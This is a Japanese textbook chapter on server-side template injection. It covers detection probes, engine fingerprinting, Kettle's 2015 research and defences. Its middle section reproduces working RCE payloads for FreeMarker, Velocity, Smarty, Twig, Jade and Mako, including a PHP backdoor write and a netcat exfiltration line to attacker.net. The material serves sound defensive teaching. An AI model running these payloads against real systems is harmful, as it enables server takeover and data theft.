# 第7章 SSTIの基礎と検出・エンジン特定

## SSTIの概要と基礎ラボ（参照）

### この節の位置づけ

SSTI（Server-Side Template Injection：サーバーサイドテンプレートインジェクション）は、Webアプリケーションがユーザー入力を「テンプレートエンジンが解釈する構文」として扱ってしまうことで発生する脆弱性である。前章までのオブジェクトデシリアライゼーション攻撃とは根本原因が異なるが、「攻撃者が制御できる文字列が、アプリケーションの内部で“データ”ではなく“コード（あるいはコードに近い評価対象）”として扱われてしまう」という構造は共通しており、最終的に任意コード実行（RCE）へとつながる代表的な脆弱性クラスである。本節ではSSTIの成り立ちと基本的な検出手法を、PortSwiggerの公式トピック解説を基に整理する。ラボそのものの攻略手順は本書のスコープ外（防御目的の教科書であり、実在システムや演習環境への攻撃手順を段階的に示すことはしない）だが、ラボが題材にしているテンプレートエンジン（ERB）の構文がなぜ危険になり得るかという「仕組み」は解説する。

### テンプレートエンジンとは何か、なぜ危険になり得るのか

テンプレートエンジンとは、静的なマークアップ（HTMLなど）の中に動的な値を埋め込むための仕組みである。たとえばTwig（PHP用）であれば次のように使う。

```php
$output = $twig->render(
    "Dear {first_name}",
    array("first_name" => $user->first_name)
);
```

ここでの`{first_name}`はテンプレート側があらかじめ用意した「プレースホルダ（差し込み口）」であり、`$user->first_name`という**データ**がその場所に流し込まれるだけである。テンプレートエンジンはこの文字列を「テンプレートの一部として構文解析（パース）」してから、変数の値を埋め込んでレンダリングする。ここで重要なのは、**テンプレート文字列そのもの（構造）と、そこに埋め込まれるデータは本来別物として扱われるべき**という点である。

問題が起きるのは、開発者が誤って次のようにユーザー入力をテンプレート文字列そのものの構築に使ってしまう場合である。

```php
$output = $twig->render("Dear " . $_GET['name']);
```
> 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection

この一行はぱっと見では前の例と大差ないように見えるが、決定的に異なる。前者では`{first_name}`というテンプレート構文（プレースホルダ）は開発者が書いたコードの中に固定で存在し、ユーザー入力は「値」としてのみ渡される。後者では、ユーザーが送信した`$_GET['name']`の中身が、**テンプレートエンジンがこれから構文解析する文字列そのものに連結**されてしまっている。つまり攻撃者が`name`パラメータに`{{7*7}}`のようなテンプレート構文を送り込めば、Twigエンジンはそれを「ユーザーの名前という単なる文字列」ではなく「評価すべきテンプレート式」として認識し、実行してしまう。

これは典型的な「コードとデータの混同（sink：入力が最終的に実行・解釈される危険な代入先、この場合はテンプレートエンジンのパーサそのものがsinkになる）」の一例である。SQLインジェクションにおける文字列連結によるクエリ構築と全く同じ構造上の欠陥であり、「本来テンプレート構造は開発者だけが書くべきものなのに、ユーザー制御の入力がその構造の一部に混入する」という点が本質的な脆弱性の根であることを押さえておきたい。

### 検出手法（1）：数式ファジングによる存在確認

もっとも基本的な検出手法は、算術演算を含むペイロードを様々な箇所（URLパラメータ、フォーム値、Cookieなど）に注入し、レスポンスにその計算結果が現れるかを観察することである。

```
http://vulnerable-website.com/?username=${7*7}
```
> 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection

もしレスポンス中の「username」欄に文字列としての`${7*7}`ではなく、計算済みの`49`が表示された場合、そのアプリケーションは入力をテンプレート式として評価している、つまりSSTIが存在する強い兆候となる。これはXSS診断における`alert(1)`のような「無害だが検出可能な副作用を持つペイロード」と同じ発想であり、通常の文字列出力（エコー）であれば`${7*7}`という文字列がそのまま返るはずが、テンプレートとして評価されると数値に変わる、という差分を手がかりにする。

なお、テンプレートエンジンによって数式の記法（デリミタ）は異なる。これは各エンジンが独自の構文パーサを持ち、テンプレート部分をどの記号で囲んで識別するかという実装上の取り決めが異なるためである。代表的な例を挙げる。

| エンジン | 言語 | 式の記法例 |
|---|---|---|
| Twig | PHP | `{{7*7}}` |
| Jinja2 | Python | `{{7*7}}` |
| FreeMarker | Java | `${7*7}` |
| Velocity | Java | `#set($x=7*7)$x` |
| ERB | Ruby | `<%= 7*7 %>` |

このように「デリミタ（区切り記号）」がエンジンごとに異なるため、診断時にはこれら複数の記法を横断的に試す必要がある。単一の記法だけを試して反応がなくても、別のエンジンが使われていれば見逃す可能性がある。

### 検出手法（2）：コードコンテキストでの構文注入

数式が反映されるplain-textコンテキスト（HTML本文にそのまま出力される文脈）とは別に、テンプレート側のコード（ロジック）の中に入力が直接組み込まれてしまう「コードコンテキスト」も存在する。この場合、基本の入力例が次のようなものだとする。

```
http://vulnerable-website.com/?greeting=data.username
```

ここで攻撃者は次のようにテンプレート構文の閉じタグと任意のHTMLタグを注入することを試みる。

```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```
> 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection

もし出力に`<tag>`がエスケープされずそのまま現れれば、`}}`によって元のテンプレート式が正しく閉じられ、後続の`<tag>`が新たなHTML/テンプレート構文として解釈されたことを意味する。これは「注入した閉じタグによってテンプレートパーサの構文解析状態を意図的に終端させ、後続の任意コンテンツを別の文脈として実行させる」という、インジェクション系脆弱性に共通するテクニックである（SQLインジェクションでのクォート脱出や、XSSでの属性/タグ脱出と原理は同じ）。

### 検出手法（3）：意図的なエラーによるエンジン特定

存在確認ができたら、次はどのテンプレートエンジンが使われているかを特定する必要がある。エンジンごとに使える関数・オブジェクト・危険な機能（サンドボックス回避手段）が異なるため、的確な攻撃ペイロードを組み立てるには特定が不可欠である。特定手法の一つが、意図的に無効な構文を注入し、返ってくるエラーメッセージからエンジン名やスタックトレースの手がかりを得る方法である。

```
<%=foobar%>
```
> 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection

このような、文法的には正しいが未定義の変数（`foobar`）を参照するコードを送り込むと、開発モードのまま稼働しているサーバーではスタックトレース付きのエラーが返され、そこに「ERB」や使用ライブラリのクラス名が含まれることがある。これはデバッグ情報の過剰な露出という別の問題（本番環境でスタックトレースを表示すべきでない、という一般原則）とも関連する。

また、前述の「エンジンごとに異なる評価結果」を利用した特定方法もある。たとえば`{{7*'7'}}`という式は、Twigでは型エラーになる一方、Jinja2では文字列の`'7'`を7回繰り返す演算として解釈され`7777777`という結果を返す。これは両エンジンの`*`演算子の型に対する挙動（数値同士の乗算しか許さないか、文字列の反復に対応しているか）の違いを利用した識別テクニックであり、単なる「動くか動かないか」ではなく「結果の質的な違い」から言語処理系の実装差を逆算する好例である。

### 参照ラボ：ERBを用いた基礎SSTI（PortSwigger Academy）

PortSwigger Academyの基礎ラボ「Server-side template injection with a basic SSTI vulnerability」は、Ruby用テンプレートエンジンである**ERB（Embedded Ruby）**を題材にしている。ERBはHTML等のテキスト中に`<%= 式 %>`という記法でRubyコードを埋め込み、その評価結果を出力に差し込む仕組みである。

```erb
<%= 式 %>
```

このラボが示す構造的な問題は、ユーザーが送信するメッセージ内容などの入力値が、サニタイズ（無害化）されないままERBのレンダリング処理に渡されている点にある。ERBは本来アプリケーション開発者が信頼できるテンプレートファイルを処理するために設計されており、`<%= %>`内に書かれた内容は「開発者が書いたRubyコード」であることが前提になっている。したがって、この評価対象にユーザー入力がそのまま混入すると、攻撃者は任意のRuby式を実行できる立場になる。Rubyは非常に強力な標準ライブラリ（OSコマンドを実行する`system`メソッドなど）を持つ汎用言語であるため、テンプレートエンジンとしての評価機構がそのままRubyインタプリタへの入口として悪用され得る、というのがこのラボが示す本質的な教訓である。

> ⚠️ **未取得の資料の補足について**: ラボページ自体からは、演習用のUI操作や具体的な攻略手順に関する記述は取得したが、それらは本書のスコープ制約（ラボ攻略手順やペイロードの段階的な実演を書かない）に従い、意図的に本節へは記載していない。（以下は本書の一般的な技術知識に基づく補足である）ERBのようにテンプレート言語がホスト言語（Ruby）の全機能に素通しでアクセスできる設計は、「ロジックフル（logic-full）」なテンプレートエンジンと呼ばれる。これに対し、後述するMustacheのように変数の展開のみを許し条件分岐やメソッド呼び出しをテンプレート内に書けないよう設計されたものは「ロジックレス（logic-less）」と呼ばれ、SSTIの影響範囲を根本的に狭める設計上の選択肢となる。

### 影響

SSTIが成立した場合の影響は、そのテンプレートエンジンがどこまでホスト言語の機能へアクセスできるかに大きく依存する。最も深刻なケースでは、攻撃者はテンプレートエンジンの評価機構を足がかりにOSコマンドを実行する関数やクラスを呼び出し、サーバー上で任意コードを実行できる。

> "At the severe end of the scale, an attacker can potentially achieve remote code execution, taking full control of the back-end server."
> 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection

これはリモートコード実行（RCE）であり、バックエンドサーバーの完全な制御を意味する。RCEに至らない場合でも、サーバー内部の設定値、環境変数、他のユーザーのセッションデータといった機密情報の読み取りに悪用されるケースがある。SSTIは「入力がコードとして評価される」という性質上、影響範囲の上限がXSSなどのクライアントサイド脆弱性よりも大きく、サーバー基盤そのものの侵害に直結し得る点が特徴である。

### 防御策

PortSwiggerが挙げる根本的な対策は次の通りである。

1. **ユーザーによるテンプレートの編集・投稿を一切許可しない**（最も確実な対策）
   > "The best way to prevent server-side template injection is to not allow any users to modify or submit new templates."
   > 出典: Server-side template injection — https://portswigger.net/web-security/server-side-template-injection
2. **ロジックレステンプレートエンジン（Mustacheなど）を採用する**：テンプレート内で任意のコード実行やメソッド呼び出しを行える機能自体を言語仕様から排除する設計であり、たとえ入力がテンプレート構文として解釈されてしまっても、実行できる操作の種類が「変数の単純な差し込みとループ・条件分岐程度」に限定されるため、被害範囲が大幅に縮小する。
3. **サンドボックス環境を構築する**：どうしてもユーザーがテンプレートの一部を制御する必要がある場合は、危険なモジュールや関数（ファイルシステムアクセス、OSコマンド実行、ネットワークアクセスなど）へのアクセスをテンプレートエンジンの実行環境から取り除く。ただしサンドボックスは既知の危険機能を塞ぐ「ブロックリスト方式」になりがちで、後年新たな脱出手法（サンドボックスエスケープ）が発見される歴史が繰り返されてきた点には注意が必要である。
4. **コンテナ等による実行環境の隔離**：Dockerのような隔離技術を用いてアプリケーションプロセスをデプロイし、たとえテンプレートエンジンの脆弱性が突かれてコード実行を許してしまっても、その影響範囲をコンテナ内に封じ込め、ホストシステムや他のサービスへの波及を防ぐ多層防御（defense in depth）の考え方である。

これらの対策に共通するのは、「入力をテンプレート構造そのものに混入させない」という設計原則を、実装の作法（データとして渡す）だけでなく、エンジン選定（ロジックレス）や実行環境（サンドボックス・隔離）という複数のレイヤーで重ねて担保する、という多層的アプローチである。次節以降では、この基礎知識を踏まえてテンプレートエンジンの識別方法や、各エンジン固有のサンドボックス脱出手法をより詳細に扱う。

## James KettleのSSTI起点研究

SSTI（Server-Side Template Injection、サーバサイド・テンプレートインジェクション）という脆弱性クラスは、2015年に PortSwigger 社の James Kettle（現・Director of Research）が公開した一連の研究によって「体系化」された。それ以前にも「テンプレートにユーザ入力を混ぜると危ない」という散発的な事例報告はあったが、（1）どんなテンプレートエンジンでも共通に使える**検出手順**、（2）出力の違いから**エンジンを特定**する方法、（3）特定できたエンジンごとに**RCE（Remote Code Execution、遠隔任意コード実行）まで持っていく攻略の型**、という三段構えを最初に整理し、脆弱性クラスとして名前を与えたのがこの研究である。本節ではその起点論文と研究ハブの内容を、原典のペイロードを引用しながら、なぜそのペイロードが機能するのかという仕組みのレベルで解説する。

> ⚠️ 本節は防御・検出の理解を目的とする。掲載するペイロードは、自分が管理する検証環境や許可を得た対象でエンジンの挙動を確認するためのものであり、実在サービスや本番環境への無許可の検証・破壊的操作に用いてはならない。

### なぜ SSTI が「XSS の一歩先」なのか

多くの Web アプリは、テンプレートエンジンを使って動的な HTML やメール本文を組み立てる。テンプレートとは、`Hello {{name}}` のような「穴あきの文書」であり、エンジンが `{{name}}` の部分を実際の値で埋めて（レンダリングして）最終的な出力を作る。ここで重要なのは、**テンプレート言語はしばしば一種のプログラミング言語**だということだ。単なる変数展開だけでなく、メソッド呼び出し・オブジェクトのプロパティアクセス・算術演算・制御構文まで書けるものが多い。

SSTI は、この**テンプレートの本文（構文そのもの）をユーザが操作できてしまう**状態を指す。XSS（Cross-Site Scripting）は「ブラウザ上で JavaScript が動く」だけだが、SSTI は「サーバ上でテンプレートエンジンが式を評価する」ため、多くの場合そのままサーバ内部への攻撃、すなわちファイル読み書きや RCE に直結する。Kettle は論文冒頭でこの差を「XSS とは異なり、SSTI はサーバ内部を直接攻撃でき、しばしば RCE に至る」と明言している。

#### 脆弱性の二つの入り込み方

Kettle は、SSTI が生まれるパターンを二つに分類した。

**（1）意図的（intentional）にテンプレート編集を許すケース。** ユーザ自身にテンプレートを書かせる設計。原典の例は次の PHP コードである。

```php
$output = $twig->render($_GET['custom_email'],
    array("first_name" => $user.first_name));
```

`$twig->render()` の**第1引数はテンプレート本文**であり、それに `$_GET['custom_email']`（ユーザ入力）をそのまま渡している。マーケティング機能などで「メール文面をユーザにカスタマイズさせたい」という要件からこうした設計が生まれるが、テンプレート本文を渡された時点で、ユーザは Twig の全構文を注入できる。

**（2）偶発的（accidental）に構文が混ざるケース。** 開発者は変数を埋めているつもりなのに、ユーザ入力を**テンプレート文字列の連結**で組み立ててしまい、結果として入力中のテンプレート構文が評価されてしまう。Kettle はこれを「不完全なプリペアドステートメントにおける SQL インジェクションと等価」と表現している。つまり、SQLi が「クエリの構造にユーザ入力が混ざる」問題であるのと同型で、SSTI は「テンプレートの構造にユーザ入力が混ざる」問題なのだ、という洞察である。この対応関係が、検出手法（後述のプローブ注入）の発想の土台になっている。

### 検出：二つのコンテキストとプローブ・ペイロード

Kettle はまず、注入点が置かれる**コンテキスト（文脈）**を二種類に分けた。ここを取り違えると検出プローブの形が合わず、脆弱性を見逃す。

#### プレーンテキスト・コンテキスト（plaintext context）

ユーザ入力が、テンプレート出力の中に**そのまま平文として現れる**場合。HTML の一部として反射される、いわば XSS を探すときと同じ状況である。ここではテンプレート構文をまるごと注入して、それが評価されるかを見る。

```
smarty=Hello {user.name}
freemarker=Hello ${username}
```

上は、`Hello ` に続けて `{user.name}`（Smarty）や `${username}`（FreeMarker）という**構文を丸ごと**送り込めることを示す。

#### コード・コンテキスト（code context）

ユーザ入力が、テンプレート内の**変数の位置**にすでに埋め込まれている場合。例：

```
personal_greeting=username
```

これはテンプレート側が `Hello {personal_greeting}` のように書かれていて、`personal_greeting` の**値**として `username` が入る状況を表す。この場合、構文を丸ごと注入するのではなく、**今いる式の文脈を一度閉じてから**新しい構文を注ぐ必要がある。原典のプローブは次の形だ。

```
username}}<tag>
```

`username}}` で（`{{ ... }}` のような）現在の式を**閉じ**、その後ろに `<tag>` のような任意のマークアップや構文を続ける。閉じ括弧が効いて後続が新しい要素として解釈されれば、コード・コンテキストでの注入が成立している証拠になる。

#### 汎用プローブ：算術式で「評価されたか」を可視化する

SSTI 検出の核心は、**「文字列がそのまま返るか、計算結果が返るか」で評価の有無を判定する**という発想だ。Kettle が示した代表的なプローブは、エンジンごとの区切り記号を変えた算術式である。

```
${7*7}      （FreeMarker, Jinja2 などの ${...} / 一部の {{...}} 系）
{7*7}       （Smarty, Velocity など単一波括弧系）
{{7*7}}     （Twig など二重波括弧系）
```

原理はシンプルで強力だ。もし注入点が単なる文字列として扱われるなら、レスポンスにはそのまま `${7*7}` という文字列が返る。ところが**テンプレートエンジンがその区切りを認識して式として評価する**と、`49` が返る。`49` という「入力に含まれていないはずの計算結果」が出力に現れたら、それはエンジンがサーバ側で式を実行した動かぬ証拠になる。`7*7` を選ぶのは、`49` が偶然ページ内に存在しにくく、かつ多くの言語で共通に成立する単純な整数演算だからである。

なぜ複数の区切りを試すのか。テンプレートエンジンごとに式のデリミタが違うためだ。`{{...}}` は Twig/Jinja2 系、`${...}` は FreeMarker や JSP/EL 系、`{...}` は Smarty/Velocity 系、というように、**同じ `7*7` でも通る括弧が違う**。片方で反応がなくても、もう片方で `49` が返ることがある。だからこそ、この後の「エンジン特定」ステップへ自然につながる。

---

### エンジン特定：言語依存ペイロードの決定木

検出できたら次は「どのエンジンか」を突き止める。RCE の書き方はエンジンごとに全く違うため、この特定は必須の工程だ。Kettle はこれを**「言語依存ペイロードの決定木（a decision tree of language-specific payloads）」**として提示した。同一のプローブに対して**エンジンごとに異なる出力**を返す性質を利用し、成功／失敗の応答パターンを枝分かれ的にたどってエンジンを絞り込む。

最も有名な分岐が、**Twig と Jinja2 を見分ける文字列演算プローブ**である。

```
{{7*'7'}}
```

このプローブに対する挙動が両エンジンで割れる。

- **Twig（PHP）** は `49` を返す。Twig の演算子は PHP の緩い型変換に近い意味論を持ち、`'7'`（文字列）に対して掛け算をすると数値 `7` として扱われ、`7*7=49` になる。
- **Jinja2（Python）** は `7777777` を返す。Python では「文字列 × 整数」は**文字列の繰り返し**を意味する（`'7' * 7 == '7777777'`）。だからテンプレート側で `7 * '7'` が評価されると `7` を 7 回並べた `7777777` になる。

同じ `{{7*'7'}}` という一つのペイロードで、返り値が `49` か `7777777` かを見るだけで、背後の言語が PHP（Twig）か Python（Jinja2）かを一撃で切り分けられる。これは「テンプレート言語の型変換規則という内部実装の差」を観測に転用した、決定木の代表例である。この考え方——**同一入力に対する挙動差でエンジンを指紋採取する**——を各エンジンの特徴的構文（`${...}` が通るか、`<#assign>` が通るか、コメント構文 `{* *}` が効くか、等）に広げていくことで、決定木は網の目のように分岐していく。

> 補足（陳腐化対策）: これらの指紋の一部はエンジンのバージョンや設定に依存する。特に後述の RCE 系ペイロードは、エンジン側のセキュリティ修正（サンドボックス強化、危険クラスのブロックリスト追加）によって時期ごとに成否が変わる。実務では「対象エンジン名 + バージョン + 該当年のセキュリティ勧告」をセットで確認すること。

### 攻略の五段階手法（Detect → Identify → Exploit）

Kettle は SSTI の攻略を再現可能な手順に落とし込んだ。全体は五つのステップからなる。

1. **Detect（検出）**: 前述の算術プローブ等で、テンプレート注入が存在するかを確認する。
2. **Identify（特定）**: 決定木でエンジンを特定する。
3. **Exploit（攻略）** は、さらに三つに分かれる。
   - **Read（読む）**: 特定したエンジンの**公式ドキュメント、とりわけセキュリティ関連の章**を読み込む。何が式として書けるのか、どんな組み込みオブジェクトやメソッドが露出しているのかを把握する。SSTI 攻略の主戦場は「未知のバイナリを叩く」ことではなく「公開された言語仕様を読み解く」ことだ、という点がこの手法の肝である。
   - **Explore（探索）**: 実際にテンプレート内から到達可能なオブジェクト・メソッド・変数を列挙する。組み込みオブジェクト、グローバル変数、現在スコープから辿れるクラス階層などを調べ、「危険な機能への到達経路」を探す。
   - **Attack（攻撃）**: 探索で見つけた到達経路を使い、エンジン固有の実際のエクスプロイト（ファイル読み書き、コマンド実行など）を組み立てる。

この「Read→Explore→Attack」というループは、なぜ SSTI が強力かを説明している。テンプレートエンジンは**サーバサイドのサンドボックス**として設計されているが、そのサンドボックスから言語ランタイムの機能（リフレクション、標準ライブラリ、プロセス起動 API）へ**一本でも経路が通っていれば**、そこがサンドボックス破りの穴になる。攻略とは、その経路を仕様書と探索から見つけ出す作業に他ならない。

### エンジン別 RCE ペイロード（原典の実物）

以下は Kettle が起点論文で示した、エンジンごとの代表的な攻略ペイロードである。**それぞれ「なぜ動くのか」の原理を必ず添える**。掲載の目的は、これらの文字列が検出・防御時の指紋やブロック対象として理解できるようになることである。

#### FreeMarker（Java）

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

FreeMarker には `freemarker.template.utility.Execute` という**ユーティリティクラス**が存在する。このクラスは「入力を受け取ってシェルコマンドとして実行する」ために作られている。`<#assign ex=...?new()>` は FreeMarker の組み込みディレクティブ `<#assign>`（変数代入）と `?new()`（クラスをインスタンス化する組み込み）を組み合わせ、`Execute` クラスのインスタンスを変数 `ex` に束縛する。続く `${ ex("id") }` で `id` コマンドを実行し、その出力をテンプレート結果として吐き出す。つまり**エンジンが公式に用意した「コマンド実行用クラス」に到達できる**ことが、そのまま RCE になる。

#### Velocity（Java）

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5")
```

Velocity では `ClassTool`（`$class`）の**リフレクション機能**が悪用される。`inspect("java.lang.Runtime")` で `java.lang.Runtime` クラスを取得し、`.type` で `Class` オブジェクトを得て、`getRuntime().exec(...)` で任意のプロセスを起動する。`sleep 5` を使っているのは、レスポンスが 5 秒遅延するかどうかで**盲目的（ブラインド）にコマンド実行の成否を判定**できるからだ（出力が画面に返らない状況でも時間差で確認できる）。Java のリフレクションは「クラス名の文字列から任意メソッドを呼べる」万能機構であり、それがテンプレートから触れると危険クラスへの到達経路になる、という典型例である。

#### Smarty（PHP）— 非サンドボックス

```
{php}echo `id`;{/php}
```

Smarty の `{php}...{/php}` タグは、囲んだ内容を**そのまま PHP コードとして実行**する。バッククォート `` `id` `` は PHP のシェル実行演算子で、`id` コマンドの出力を返す。テンプレート言語が「生の PHP を書ける機能」を提供している以上、そこにユーザ入力が届けば即 RCE となる。（このタグは後の Smarty で非推奨・削除の方向に進んだため、対象バージョンに依存する。）

#### Smarty（PHP）— セキュアモードのバイパス

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

Smarty のセキュアモードは `{php}` 等を封じるが、Kettle は**内部クラスの静的メソッド呼び出し**で回避できることを示した。`Smarty_Internal_Write_File::writeFile(...)` を呼び、`$SCRIPT_NAME`（実行中スクリプトのパス）に `<?php passthru($_GET['cmd']); ?>` という**PHP バックドア**を書き込む。以後は `?cmd=...` で任意コマンドを実行できる。サンドボックスが「危険なタグ」を塞いでも、「内部クラスの静的メソッド」という別経路が開いていれば破られる、という教訓である。

#### Twig（PHP）— 非サンドボックス

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig のテンプレートからは `_self`（現在のテンプレートオブジェクト）を通じて `env`（`Twig_Environment`）に到達できる。`registerUndefinedFilterCallback("exec")` は「未定義のフィルタが呼ばれたときのコールバック」に PHP の `exec` 関数を登録する。その状態で `getFilter("id")` を呼ぶと、`id` という未定義フィルタの解決時にコールバックの `exec("id")` が発火し、コマンドが実行される。**Environment オブジェクトに任意の PHP 関数をフィルタとして登録できる**というのが穴だ。

#### Twig（PHP）— サンドボックスのバイパス

```
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

Twig のサンドボックス（`SecurityPolicy`）は関数のホワイトリストで守るが、**`_self` オブジェクトは任意のメソッドを呼べるという例外**があった。この例外を突いて `displayBlock` を悪用し、`userObject` の `vulnerableMethod`（アプリ側が持つ危険なメソッド等）を関数ホワイトリストを迂回して呼び出す。サンドボックスの「例外的に信頼される内部オブジェクト」が、そのまま抜け穴になるという構図である。

#### Jade（Node.js）

```
- var x = root.process.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

Jade（現 Pug）では、グローバルの `root` オブジェクトから `process.mainModule.require` を辿り、Node.js の `require` 関数を掴む。それで `child_process` モジュールを読み込み、`exec` で `id` を実行、結果を `nc`（netcat）で外部へ送っている。**グローバルオブジェクト → process → require → 危険モジュール**というプロパティ連鎖でサンドボックスの外（Node ランタイムの全機能）へ到達する、JavaScript 系 SSTI の典型パターンだ。

> ⚠️ 上記の `nc attacker.net 80` のように外部へデータを送出する手順は、無許可の対象で行えばデータ持ち出しに当たる。原典の記述としてメカニズムを示すが、検証は自分が管理する隔離環境に限ること。

#### Mako（Python）

```
<% import os; x=os.popen('id').read() %>${x}
```

Mako は `<% ... %>` の中に**生の Python 文**を書ける。`import os` で標準ライブラリを取り込み、`os.popen('id').read()` でコマンド出力を得て、`${x}` で表示する。テンプレートが Python 実行環境をそのまま露出しているため、防壁が事実上存在しない。

### 影響と防御

#### 影響（原典より）

- 任意のファイル読み書き
- 露出したクラス・リフレクション経由の RCE
- 管理者専用メソッドの呼び出しによる権限昇格
- 蓄積型 XSS と組み合わせた不正なバックドア設置
- 環境変数アクセスによる情報漏えい（認証情報・秘密鍵など）

要するに SSTI は、単独でサーバ乗っ取りに至りうる高深刻度の脆弱性であり、他の脆弱性（保存型 XSS 等）と連鎖するとさらに被害が拡大する。

#### 防御（原典より）

Kettle が挙げた対策は、**「そもそもユーザにテンプレートを書かせない」を最優先とし、どうしても必要なら多層に閉じ込める**という方針である。

1. **ロジックを持たないテンプレートエンジンを使う**。ユーザ入力をテンプレートに関わらせる場合は、Mustache や Python の `string.Template` のような**式評価能力のない**単純なエンジンを選ぶ。演算やメソッド呼び出しができなければ、RCE の足場そのものが無い。
2. **サンドボックス化された実行環境**（Lua、Docker コンテナ等）でレンダリングを隔離する。
3. **ケーパビリティの剥奪と読み取り専用ファイルシステム**を適用し、万一の突破時の被害を限定する。
4. **信頼できないユーザにテンプレート編集を許さない**。本当に不可欠でない限り、テンプレート編集機能そのものを露出しない。
5. **デプロイ前にセキュリティ観点のドキュメントレビュー**を行う。

原典は重要な原則を一文で述べている——**「テンプレートエンジンはサーバサイドのサンドボックスである」**。そして、たとえサンドボックスを謳うエンジンであっても、信頼できないユーザにテンプレート編集を許すこと自体が「重大なリスク」を持ち込む、と結論づけている。Twig・Smarty のサンドボックス・バイパス例が示すとおり、サンドボックスは「破られうる境界」であって「破れない壁」ではない。だからこそ、第一の防御は「サンドボックスを固くする」ことではなく「信頼できない入力をテンプレート構文の位置に置かない」ことなのだ。

> 出典: Server-Side Template Injection（James Kettle, 2015年8月5日公開／2025年9月3日更新） — https://portswigger.net/research/server-side-template-injection

### 研究ハブ：SSTI/CSTI 研究群の位置づけ

PortSwigger の Template Injection 研究ハブは、この分野の資料を「サーバサイド（SSTI）」と「クライアントサイド（CSTI）」に整理して束ねるページである。

- **SSTI**: 2015年に PortSwigger が体系化した技術として、エンジンの検出手法・エンジン別攻略・実習ラボ（Web Security Academy）が紹介される。象徴的な発表が Black Hat USA での **"Server-Side Template Injection: RCE for the Modern Webapp"** である。
- **CSTI（Client-Side Template Injection）**: ブラウザ内、特に AngularJS のような JavaScript フレームワークで、ユーザ入力がテンプレート式を定義できてしまう問題。攻撃者は簡略化された JavaScript を注入でき、影響は XSS に近い。ハブでは AngularJS の**サンドボックス・エスケープ**、実アプリでの悪用、**CSP（Content Security Policy）バイパス**、2017年 BSides Manchester の **"DOM Based Angular Sandbox Escapes"** などが扱われる。
- **登場する研究者**: James Kettle、Gareth Heyes、Zakhar Fedotkin、Tom Stacey。SSTI/CSTI が単発の発見ではなく、複数の研究者による継続的な研究テーマとして育っていることが分かる。

CSTI と SSTI を並置しているのは、両者が「テンプレート式の位置にユーザ入力が届く」という同じ根を持ちながら、実行される場所（ブラウザかサーバか）と最終的な影響（XSS 相当か RCE か）が異なる、という対比を示すためである。本書が扱う「安全でないデシリアライゼーション + SSTI = RCE」という主題においては、SSTI 側が RCE への主要な一本道であり、Kettle のこの起点研究がその地図の原点になっている。

> 出典: Template Injection（PortSwigger Research ハブ） — https://portswigger.net/research/template-injection

### 本節のまとめ

- SSTI は「テンプレート本文（構文）にユーザ入力が混ざる」脆弱性であり、SQLi と同型の問題として理解できる。テンプレート言語はしばしば実行能力を持つため、XSS と違ってサーバ側 RCE に直結する。
- Kettle の起点研究は **Detect → Identify → Exploit（Read→Explore→Attack）** の五段階手法を確立した。検出は `${7*7}` / `{7*7}` / `{{7*7}}` の算術プローブで「計算結果 `49` が返るか」を見る。
- エンジン特定は「同一入力への挙動差」で指紋採取する。`{{7*'7'}}` が `49`（Twig／PHP の型変換）か `7777777`（Jinja2／Python の文字列反復）かで PHP 系と Python 系を切り分けられる。
- RCE は各エンジンが露出する「言語ランタイムへの経路」（FreeMarker の Execute、Velocity/Java のリフレクション、Jade/Node の require 連鎖、Smarty/Mako の生コード実行）を突く。サンドボックスは Twig・Smarty のバイパス例が示すとおり破られうる。
- ゆえに最優先の防御は「サンドボックスを固くする」ことではなく、**ロジックを持たないエンジンを選び、信頼できない入力をテンプレート構文の位置に置かない**ことである。

## SSTI検出とエンジン特定のdecision tree

### この節で扱うこと

SSTI（Server-Side Template Injection、サーバーサイドテンプレートインジェクション。ユーザー入力がテンプレートエンジンの「テンプレート文字列」としてそのままパース・評価されてしまう脆弱性）を見つける最初の関門は、「これは本当にSSTIか、それとも単なるXSSか」を切り分けることであり、次の関門は「どのテンプレートエンジンが動いているか」を特定することです。この2つを誤ると、その後の攻撃ペイロード（`{{7*7}}`のような、テンプレートエンジンに評価させる式）が全く効かず、脆弱性そのものを見逃してしまいます。本節では、この判定を機械的に行うための decision tree（分岐によって答えに辿り着く判定木）を、実際に使われている手法・ツール・ペイロード表に基づいて解説します。

### なぜ「decision tree」という考え方が必要か

テンプレートエンジンは世界に数十種類存在し、構文もまちまちです（`{{ }}`、`${ }`、`#{ }`、`<%= %>`など）。闇雲に全エンジンのペイロードを試すのは非効率であり、WAF（Web Application Firewall）に検知されるリスクも増えます。そこで、**少数の「汎用的で無害に近い式」を最初に投げ、その応答パターン（評価された/エラーになった/無変化だった）を観察することで候補エンジンを絞り込み、最後に決定打となるエンジン固有構文で確定させる**、という段階的なアプローチが実務で使われています。これがdecision treeの本質です。

### ステップ0: そもそも「テンプレートに触れているか」を疑うタイミング

decision treeに入る前に、次のような兆候があるとSSTIを疑う根拠になります。

- 入力値がメール本文、PDF帳票、エラーページ、プロフィール表示欄など「動的に文章を組み立てて出力する」機能に使われている
- レスポンスヘッダやエラーメッセージにテンプレートエンジン名やそのライブラリのスタックトレースが漏れている（例: `Jinja2`, `Twig`, `freemarker.core`, `org.apache.velocity` など）
- フレームワークの選定（Flask/Django→Jinja2系、Spring→Thymeleaf/FreeMarker/Velocity、PHP系→Twig/Smarty、Ruby→ERB/Slim、Node.js→Pug/Handlebars/Nunjucks）から使用エンジンの見当がつく

### ステップ1: 汎用ファジングペイロードで「テンプレート処理が起きているか」を確認する

HackTricksが示す最初のフェーズは、特殊文字を組み合わせた汎用ペイロードを送り込み、通常の入力と応答がどう違うかを観察することです。

```
${{<%[%'"}}%\
```

> 出典: HackTricks: SSTI — https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html

